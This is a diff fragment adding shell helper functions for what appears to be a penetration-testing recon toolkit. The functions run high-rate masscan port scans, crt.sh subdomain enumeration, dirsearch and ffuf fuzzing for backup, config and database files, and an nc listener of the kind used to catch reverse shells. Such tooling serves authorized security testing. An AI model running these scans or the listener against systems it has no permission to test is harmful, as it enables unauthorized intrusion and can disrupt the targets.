+    masscan -p80,443,8020,50070,50470,19890,19888,8088,8090,2075,2076,6443,3868,3366,8443,8080,9443,9091,3000,8000,5900,8081,6000,10000,8181,3306,5000,10000,4000,8888,5432,15672,9999,161,4044,7077,4040,9000,8089,7447,7080,8880,8983,5673,7443,19000,19080 --rate=100000 --open -iL $1 --banners -oG famous_ports.txt
+  }
+  HKP_mscanall(){
+    masscan -p0-65535 --rate=100000 --open -iL $1 --banners -oG all_ports.txt
+  }
+  HKP_crtshdirsearch(){
+    curl -s https://crt.sh/?q\=%.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httprobe -c 50 | grep https | xargs -n1 -I{} python3 ~/tools/dirsearch/dirsearch.py -u {} -e $2 -t 50 -b
+  }
+  HKP_crawl(){
+    echo $1 | hakrawler -depth 3 -plain
+  }
+  HKP_dirsearch(){
+    cd ~/tools/dirsearch
+    sudo python3 dirsearch.py -u $1 -e htm,html,xml,js,json,zip,asp,aspx,php,bak,sql,old,txt,gz,gz.tar -x 301,404,400,429 -t 200
+    cd -
+  }
+  HKP_crtndstry(){
+    ./tools/crtndstry/crtndstry $1
+  }
+  HKP_thewadl(){
+    curl -s $1 | grep path | sed -n "s/.*resource path=\"\(.*\)\".*/\1/p" | tee -a ~/tools/dirsearch/db/yahooapi.txt
+  }
+  HKP_dirapi(){
+    cd ~/tools/dirsearch
+    sudo python3 dirsearch.py -u $1 -e htm,html,xml,js,json,zip,asp,aspx,php,bak,sql,old,txt,gz,gz.tar -x 301,429,404,400 -t 200 -w db/apiwords.txt
+    cd -
+  }
+  HKP_fuffiles(){
+    ffuf -u $1/FUZZ -w ~/tools/dirsearch/db/raft-large-files.txt -mc 200,301,302 -t 50
+  }
+  HKP_fufdir(){
+    ffuf -u $1/FUZZ -w ~/tools/dirsearch/db/raft-large-directories.txt -mc 200,301,302,403 -t 70
+  }
+  HKP_dirsearch(){
+    cd ~/tools/dirsearch
+    sudo python3 dirsearch.py -u $1 -e htm,html,xml,js,json,zip,asp,aspx,php,bak,sql,old,txt,gz,gz.tar -x 301,502,404,400,429 -t 200
+    cd -
+  }
+  HKP_ncx(){
+    nc -l -n -vv -p $1 -k
+  }
+  HKP_digit(){
+    dig @8.8.8.8 $1 CNAME
+  }
+  HKP_wordlist(){
+    # Put here PATHS to worlists Directories
+    Woordlist_RockYou_PATH="/usr/share/wordlist/rockyou.txt"
+  }
+  HKP_fufextension(){
+    ffuf -u $1/FUZZ -mc 200,301,302,403,401 -t 150 -w ~/tools/dirsearch/db/ffuf_extension.txt -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sql,json,xml,log
+  }
+  HKP_fufthis(){
+    ffuf -u $1/FUZZ -mc 200,301,302,403,401 -t 150 -w $(pwd)/wordlist.txt -e php,asp,aspx,jsp,txt,conf,config,bak,backup,old,db,sql,json,xml,log
+  }
+}
